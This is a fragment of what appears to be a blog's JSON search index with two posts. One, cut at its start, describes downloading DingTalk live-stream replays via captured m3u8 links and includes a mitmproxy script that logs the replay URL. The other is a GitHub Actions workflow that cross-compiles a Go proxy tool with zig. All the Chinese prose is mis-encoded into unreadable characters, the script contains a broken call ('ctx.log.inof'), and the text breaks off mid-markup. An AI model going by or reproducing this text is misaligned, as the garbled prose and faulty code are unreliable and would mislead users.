\u003cstrong\u003e\u003ccode\u003ehttps://h5.dingtalk.com/group-live-share/index.htm?type=2\u0026amp;liveFromType=6\u0026amp;liveUuid=xxxx\u0026amp;bizType=dingtalk\u0026amp;dd_nav_bgcolor=FF2C2D2F#/union\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæµè§ˆå™¨æ‰“å¼€è¿™ä¸ªé“¾æ¥ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ’­å›æ”¾\u003c/p\u003e\n\u003cp\u003eæ’­æ”¾è§†é¢‘ï¼Œæ‰“å¼€f12è¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªé“¾æ¥\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://dtliving-sh.dingtalk.com/live_hp/xxxx_merge.m3u8?auth_key=xxxxxx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªé“¾æ¥ä¸­ï¼Œxxxxæ˜¯ä¸Šé¢liveUuidï¼Œç„¶åä¼šçœ‹åˆ°ä¸€ä¸ªm3u8ï¼Œç„¶åä½¿ç”¨å…¶ä»–çš„å·¥å…·ä¸‹è½½å¹¶åˆå¹¶m3u8å³å¯\u003c/p\u003e\n\u003cp\u003eå…¶å®ä¸Šé¢çš„jsonä¸­çš„ \u003ccode\u003eliveUrlHls\u003c/code\u003e ****ä¸­çš„auth_keyå¯ä»¥ç”¨åœ¨æ‹¼æ¥m3u8é“¾æ¥ä¸Šï¼Œä½†æ˜¯å‘ç°ä¸‹è½½ \u003ccode\u003eliveUrlHls\u003c/code\u003e éœ€è¦å•ç‚¹ç™»å½•ï¼ˆä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯æˆ‘ä»¬å…¬å¸çš„é…ç½®ï¼‰ï¼Œè€Œä¸‹è½½ä¸Šé¢m3u8é“¾æ¥éœ€è¦ç½‘é¡µç™»å½•åcookieä¸­PC_SESSIONå€¼\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥è¿˜æ˜¯ç›´æ¥æ‰“å¼€ç½‘é¡µåä½¿ç”¨idmä¹‹ç±»çš„è½¯ä»¶è¿›è¡Œä¸‹è½½å§ã€‚\u003c/p\u003e\n\u003cp\u003eç»™å‡ºä¸€ä»½mitmproxyçš„è„šæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e20\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e21\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e22\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e23\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e24\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e25\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e26\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e27\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e28\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e29\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e30\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e mitmproxy \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e mitmproxy \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e ctx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e re\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epattern \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e re\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecompile(\u003cspan style=\"color:#e6db74\"\u003er\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\[live\\-playback\\-room\\].+?\\[response\\](\\{.+\\})\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e(flow: http\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eHTTPFlow) \u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# if flow.request.pretty_host != \u0026#39;retcode.taobao.com\u0026#39;:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#     return\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e flow\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erequest\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epath\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estartswith(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/r.png\u0026#39;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    msg \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e flow\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erequest\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003equery\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;msg\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e msg:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e pattern\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003ematch\u003c/span\u003e(msg):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pattern\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esearch(msg)[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e json\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eloads(data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eException\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    live_info \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e data\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;liveInfo\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e live_info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    live_uuid \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e live_info\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;liveUuid\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ctx\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003elog\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einfo(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;è·å–åˆ° liveUuid \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003elive_uuid\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    live_url_hls \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e live_info\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;liveUrlHls\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ctx\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003elog\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einfo(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;è·å–åˆ° liveUrlHls \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003elive_url_hls\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ctx\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003elog\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einof(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;è¯·æ‰“å¼€ç½‘é¡µä½¿ç”¨IDMè¿›è¡Œä¸‹è½½: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003elive_info\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;publicLandingUrl\u0026#39;\u003c/span\u003e)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eè‡ªåŠ¨åŒ–çš„æ–¹æ¡ˆï¼Œä¹‹åå†èŠ±æ—¶é—´ç ”ç©¶\u003c/p\u003e","title":"é’‰é’‰ç›´æ’­å›æ”¾ä¸‹è½½"},{"content":"ä½¿ç”¨zigåœ¨linuxä¸Šäº¤å‰ç¼–è¯‘cgo çš„ github actionï¼Œæ­¤å¤„ä¸åšè§£é‡Šäº†ï¼Œè‡ªå·±å¯ä»¥çœ‹æ³¨é‡Šè¿›è¡Œå®éªŒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 name: build on: push: tags: - \u0026#39;*\u0026#39; jobs: build-rotateproxy: runs-on: ubuntu-18.04 steps: - name: Checkout uses: actions/checkout@v2 - name: Setup Zig uses: goto-bus-stop/setup-zig@v1 with: version: 0.9.1 - name: Setup Golang uses: actions/setup-go@v2 with: go-version: 1.17 - name: Build RotateProxy run: | # download macos sysroot git clone --depth=1 https://github.com/hexops/sdk-macos-12.0.git \u0026#34;$HOME/macos-SDK\u0026#34; # create zig script mkdir -p \u0026#34;$HOME/.bin\u0026#34; export PATH=$PATH:\u0026#34;$HOME/.bin\u0026#34; touch \u0026#34;$HOME/.bin/zcc\u0026#34; \u0026amp;\u0026amp; touch \u0026#34;$HOME/.bin/zxx\u0026#34; chmod +x \u0026#34;$HOME/.bin/zcc\u0026#34; \u0026amp;\u0026amp; chmod +x \u0026#34;$HOME/.bin/zxx\u0026#34; mkdir -p build cd cmd/rotateproxy configs=( \u0026#39;linux amd64 x86_64-linux-musl\u0026#39; \u0026#39;linux 386 i386-linux-musl\u0026#39; \u0026#39;windows amd64 x86_64-windows-gnu\u0026#39; \u0026#39;windows 386 i386-windows-gnu\u0026#39; \u0026#39;darwin amd64 x86_64-macos-gnu\u0026#39; ) IFS=$\u0026#39;\\n\u0026#39; for i in ${configs[@]} do IFS=$\u0026#39; \u0026#39; config=($i) goos=${config[0]} goarch=${config[1]} libc=${config[2]} ext=\u0026#39;\u0026#39; if [ \u0026#34;${goos}\u0026#34; = \u0026#34;windows\u0026#34; ];then ext=\u0026#39;.exe\u0026#39; fi # ref: https://dev.to/kristoff/zig-makes-go-cross-compilation-just-work-29ho echo \u0026#34;goos: ${goos} goarch: ${goarch} libc: ${libc}\u0026#34; echo \u0026#39;#!/bin/sh\u0026#39; \u0026gt; \u0026#34;$HOME/.bin/zcc\u0026#34; echo \u0026#39;#!/bin/sh\u0026#39; \u0026gt; \u0026#34;$HOME/.bin/zxx\u0026#34; # ref: https://github.com/ziglang/zig/issues/10660 # ref: https://github.com/ziglang/zig/issues/1349 # ref: https://github.com/ziglang/zig/issues/10299#issuecomment-989153750 if [ \u0026#34;${goos}\u0026#34; = \u0026#34;darwin\u0026#34; ];then # zig 0.10.0å…³äºsysrootçš„è¡Œä¸ºæœ‰å˜æ›´ï¼Œå‚è§ https://github.com/ziglang/zig/issues/10790#issuecomment-1030712395 echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig cc -target \u0026#39;${libc}\u0026#39; --sysroot=\u0026#34;$HOME/macos-SDK/root\u0026#34; -I\u0026#34;$HOME/macos-SDK/root/usr/include\u0026#34; -L\u0026#34;$HOME/macos-SDK/root/usr/lib\u0026#34; -F\u0026#34;$HOME/macos-SDK/root/System/Library/Frameworks\u0026#34; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zcc\u0026#34; echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig c++ -target \u0026#39;${libc}\u0026#39; --sysroot=\u0026#34;$HOME/macos-SDK/root\u0026#34; -I\u0026#34;$HOME/macos-SDK/root/usr/include\u0026#34; -L\u0026#34;$HOME/macos-SDK/root/usr/lib\u0026#34; -F\u0026#34;$HOME/macos-SDK/root/System/Library/Frameworks\u0026#34; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zxx\u0026#34; # zig cc è°ƒç”¨clangï¼Œclangæ›´æ–°åé»˜è®¤åŠ äº†ä¸€äº›å‚æ•°ï¼Œè§ https://github.com/golang/go/issues/38876 https://stackoverflow.com/questions/42074035 # ç»è¿‡æµ‹è¯•æœ€åŸºæœ¬éœ€è¦ -Wno-nullability-completeness -Wno-expansion-to-defined -Wno-availability export CGO_CPPFLAGS=\u0026#34;-Wno-error -Wno-nullability-completeness -Wno-expansion-to-defined -Wno-builtin-requires-header -Wno-availability\u0026#34; else echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig cc -target \u0026#39;${libc}\u0026#39; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zcc\u0026#34; echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig c++ -target \u0026#39;${libc}\u0026#39; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zxx\u0026#34; fi cat \u0026#34;$HOME/.bin/zxx\u0026#34; cat \u0026#34;$HOME/.bin/zcc\u0026#34; CGO_ENABLED=1 GOOS=\u0026#34;${goos}\u0026#34; GOARCH=\u0026#34;${goarch}\u0026#34; CC=\u0026#34;zcc\u0026#34; CXX=\u0026#34;zxx\u0026#34; go build -o \u0026#34;../../build/rotateproxy-${goos}-${goarch}${ext}\u0026#34; -trimpath -ldflags=\u0026#34;-linkmode=external -extldflags=-static -s -w\u0026#34; done - name: Run GoReleaser uses: goreleaser/goreleaser-action@v2 with: version: latest args: release --rm-dist env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} ","permalink":"https://www.hacktech.cn/post/2023-02-13-%E4%BD%BF%E7%94%A8zig%E5%9C%A8linux%E4%B8%8A%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91cgo.html","summary":"\u003cp\u003eä½¿ç”¨zigåœ¨linuxä¸Šäº¤å‰ç¼–è¯‘cgo çš„ github actionï¼Œæ­¤å¤„ä¸åšè§£é‡Šäº†ï¼Œè‡ªå·±å¯ä»¥çœ‹æ³¨é‡Šè¿›è¡Œå®éªŒ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e20\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e21\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e22\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e23\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e24\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e25\n\u003c/span\u003e\u003cspan 